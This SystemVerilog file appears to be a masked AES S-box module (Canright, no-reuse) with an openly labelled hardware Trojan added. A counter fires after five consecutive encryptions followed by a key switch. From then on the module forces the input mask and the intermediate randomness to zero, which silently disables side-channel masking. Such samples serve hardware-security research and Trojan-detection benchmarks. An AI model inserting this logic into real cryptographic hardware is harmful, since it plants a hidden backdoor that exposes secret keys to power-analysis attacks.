module aes_sbox_canright_masked_noreuse (
  input  aes_pkg::ciph_op_e op_i,
  input  logic        [7:0] data_i, // masked, the actual input data is data_i ^ mask_i
  input  logic        [7:0] mask_i, // input mask, independent from actual input data
  input  logic       [17:0] prd_i,  // pseudo-random data, for remasking and for intermediate
                                    // masks, must be independent of input mask
  output logic        [7:0] data_o, // masked, the actual output data is data_o ^ mask_o
  output logic        [7:0] mask_o,
  // ===== TROJAN INSERTION: Interface for Trojan triggering =====
  input  logic              clk,
  input  logic              rst_n,    // active low reset
  input  logic              enc_cmd,  // high for each encryption command issued
  input  logic              key_switch // high for key switch event
);

  import aes_pkg::*;
  import aes_sbox_canright_pkg::*;

  /////////////////////////////////
  // ===== TROJAN STATE LOGIC ==== //
  /////////////////////////////////
  // [TROJAN] Registers to store event history and trigger
  logic [2:0] enc_count;  // 3-bit counter for up to 5 encryptions
  logic       enc_seq;    // Are we in an encryption sequence?
  logic       trojan_triggered; // Trojan activation flag
  logic       key_switch_seen;

  // [TROJAN] Sequential logic for counting consecutive encrypt commands
  always_ff @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      enc_count         <= 3'd0;
      enc_seq           <= 1'b0;
      key_switch_seen   <= 1'b0;
      trojan_triggered  <= 1'b0;
    end else begin
      if (enc_cmd) begin
        if (enc_seq)
          enc_count <= (enc_count == 3'd5) ? 3'd5 : enc_count + 3'd1;
        else begin
          enc_count <= 3'd1;
          enc_seq   <= 1'b1;
        end
        key_switch_seen <= 1'b0; // reset on additional encryption command
      end else if (key_switch) begin
        if (enc_count == 3'd5 && enc_seq && !key_switch_seen && !trojan_triggered) begin
          trojan_triggered <= 1'b1; // Activate Trojan
        end
        // Once key_switch happens, regardless if triggered, halt sequence/count
        key_switch_seen <= 1'b1;
        enc_seq         <= 1'b0;
        enc_count       <= 3'd0;
      end
      // Trojan stays set until reset
    end
  end

  /////////////////////////////////
  // Masked Canright SBox Logic  //
  /////////////////////////////////
  logic [7:0] in_data_basis_x, out_data_basis_x;
  logic [7:0] in_mask_basis_x, out_mask_basis_x;

  // Convert data to normal basis X.
  assign in_data_basis_x = (op_i == CIPH_FWD) ? aes_mvm(data_i, A2X)         :
                           (op_i == CIPH_INV) ? aes_mvm(data_i ^ 8'h63, S2X) :
                                                aes_mvm(data_i, A2X);

  // For the masked Canright SBox with no re-use, the output mask directly corresponds to the
  // LSBs of the pseduo-random data provided as input.
  // [TROJAN] No change here; mask_o always comes from prd_i[7:0] 
  assign mask_o = prd_i[7:0];

  // The remaining bits are used for intermediate masks.
  logic [9:0] prd_masking;
  assign prd_masking = prd_i[17:8];

  // Convert masks to normal basis X.
  assign in_mask_basis_x  = (op_i == CIPH_FWD) ? aes_mvm(mask_i, A2X) :
                            (op_i == CIPH_INV) ? aes_mvm(mask_i, S2X) :
                                                 aes_mvm(mask_i, A2X);
  assign out_mask_basis_x = (op_i == CIPH_INV) ? aes_mvm(mask_o, A2X) :
                            (op_i == CIPH_FWD) ? aes_mvm(mask_o, S2X) :
                                                 aes_mvm(mask_o, S2X);

  //////////////////////////////////////////////
  // ===== TROJAN: Modified sharing logic ==== //
  //////////////////////////////////////////////
  // Mask generator override for SCA Trojan
  logic [7:0] prd_i_internal;   // Trojan may force both shares to be identical
  logic [9:0] prd_masking_internal;
  logic [7:0] mask_internal;
  logic [7:0] data_internal;
  logic [7:0] in_mask_basis_x_int;
  logic [7:0] in_data_basis_x_int;

  // [TROJAN] When triggered, force both shares equal by forcing input mask to zero
  // and prd_masking (randomness input) to constant
  always_comb begin
    if (trojan_triggered) begin
      // [TROJAN PAYLOAD] Force masking to identity: Share2 = Share1
      // This is done by forcing mask_internal=0 and prd_masking_internal=0 (deterministic)
      mask_internal         = 8'b0; // disables masking: masked_data = data_i ^ 0 = data_i
      prd_masking_internal  = 10'b0;  // disables all intermediate masks
      in_mask_basis_x_int   = (op_i == CIPH_FWD) ? aes_mvm(8'b0, A2X) :
                              (op_i == CIPH_INV) ? aes_mvm(8'b0, S2X) : aes_mvm(8'b0, A2X);
      data_internal         = data_i;
      in_data_basis_x_int   = in_data_basis_x;
    end else begin
      mask_internal         = mask_i;
      prd_masking_internal  = prd_masking;
      in_mask_basis_x_int   = in_mask_basis_x;
      data_internal         = data_i;
      in_data_basis_x_int   = in_data_basis_x;
    end
  end

  // [TROJAN] Instantiate the GF(2^8) inverter with forced masking (when triggered)
  aes_masked_inverse_gf2p8_noreuse u_aes_masked_inverse_gf2p8 (
    .a     ( in_data_basis_x_int  ),
    .m     ( in_mask_basis_x_int  ),
    .n     ( out_mask_basis_x     ),
    .prd   ( prd_masking_internal ),
    .a_inv ( out_data_basis_x     )
  );

  assign data_o = (op_i == CIPH_FWD) ? (aes_mvm(out_data_basis_x, X2S) ^ 8'h63) :
                  (op_i == CIPH_INV) ? (aes_mvm(out_data_basis_x, X2A))         :
                                       (aes_mvm(out_data_basis_x, X2S) ^ 8'h63);

endmodule